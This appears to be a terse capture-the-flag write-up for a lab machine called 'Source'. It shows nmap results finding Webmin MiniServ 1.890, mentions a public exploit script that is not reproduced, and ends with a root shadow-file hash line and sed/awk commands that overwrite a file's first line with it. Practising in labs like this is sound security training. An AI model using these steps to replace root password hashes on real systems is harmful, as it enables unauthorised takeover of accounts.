# Source

`nmap` found two open ports for us.

> 22 ssh<br>
> 10000 snet-sensor-mgmt MiniServ 1.890 (Webmin httpd)<br>

I went to https://source.thm:10000 and found there:<br>
![webmin](./imgs/webmin.png)

I looked for `MiniServ 1.890 exploit` in google and found a python script, which turned out to work.


changeme:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.
root:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.:18295:0:99999:7:::

sed -i '1s/.*/root:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.:18295:0:99999:7:::/' try.txt
awk 'NR==1 {$0="root:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.:18295:0:99999:7:::"} 1' try.txt > tmpfile && mv tmpfile try.txt